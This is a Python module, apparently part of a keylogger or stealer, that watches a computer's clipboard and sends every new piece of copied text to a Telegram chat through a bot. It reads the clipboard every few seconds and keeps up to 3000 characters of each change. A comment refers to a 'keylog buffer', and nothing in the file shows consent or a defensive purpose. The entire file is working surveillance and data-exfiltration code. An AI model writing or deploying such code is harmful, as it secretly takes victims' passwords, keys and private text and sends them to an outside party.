import asyncio
import pyperclip
import time
from datetime import datetime
import logging # Import logging

logger = logging.getLogger(__name__) # Get logger

# Variable to store the last known clipboard content
last_clipboard_content = ""

async def check_clipboard(send_func, bot_token, chat_id, interval=10):
    """Periodically checks the clipboard and sends changes via the send function."""
    global last_clipboard_content

    print("Starting clipboard monitor...")
    # Initialize last content on start
    try:
        last_clipboard_content = pyperclip.paste()
        if last_clipboard_content:
             logger.info(f"Initial clipboard content captured (length: {len(last_clipboard_content)}).")
             print(f"Initial clipboard content captured (length: {len(last_clipboard_content)}).") # Keep print for startup info
        else:
             logger.info("Clipboard is initially empty.") # Log info
             print("Clipboard is initially empty.")
    except pyperclip.PyperclipException as e:
        logger.error(f"Error accessing clipboard initially: {e}. Clipboard monitoring might fail.", exc_info=True)
        print(f"Error accessing clipboard initially: {e}. Clipboard monitoring might fail.")
        # Optionally send an error message via Telegram
        # try:
        #     asyncio.create_task(send_func(bot_token, chat_id, f"ERROR: Failed to initialize clipboard monitor: {e}"))
        # except Exception as send_e:
        #     logger.error(f"Failed to send clipboard init error notification: {send_e}")
        last_clipboard_content = None # Indicate failure to initialize
    except Exception as e: # Catch potential OS-specific errors
        logger.exception(f"Unexpected OS-specific error accessing clipboard initially: {e}")
        print(f"Unexpected OS-specific error accessing clipboard: {e}")
        last_clipboard_content = None

    while True:
        await asyncio.sleep(interval)
        current_clipboard_content = None
        try:
            current_clipboard_content = pyperclip.paste()
        except pyperclip.PyperclipException as e:
            # This might happen if clipboard is inaccessible (e.g., remote desktop)
            logger.warning(f"Error reading clipboard: {e}") # Log as warning, might be temporary
            # print(f"Error reading clipboard: {e}") # Reduce console noise
            continue # Skip this check
        except Exception as e: # Catch potential OS-specific errors
             logger.exception(f"Unexpected OS-specific error reading clipboard: {e}")
             # print(f"Unexpected OS-specific error reading clipboard: {e}")
             continue

        # Check if content is valid and different from the last known content
        if current_clipboard_content is not None and last_clipboard_content != current_clipboard_content:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            logger.info(f"Clipboard changed! (Length: {len(current_clipboard_content)})") # Log change as info
            print(f"{timestamp} - Clipboard changed! (Length: {len(current_clipboard_content)})") # Keep print for visibility
            last_clipboard_content = current_clipboard_content

            # Prepare message for Telegram (truncate if too long)
            max_len = 3000 # Keep it shorter than keylog buffer due to potential large pastes
            display_content = current_clipboard_content
            if len(display_content) > max_len:
                display_content = display_content[:max_len] + "... [TRUNCATED]"

            message = f"Clipboard Content Changed ({timestamp}):\n```\n{display_content}\n```"
            # Send the change using the provided async function
            try:
                 # Using create_task for non-blocking send
                 asyncio.create_task(send_func(bot_token, chat_id, message))
                 logger.info(f"Task created for sending clipboard change (length: {len(current_clipboard_content)}).")
            except Exception as e:
                 logger.error(f"Failed to create task for sending clipboard content to Telegram: {e}", exc_info=True) 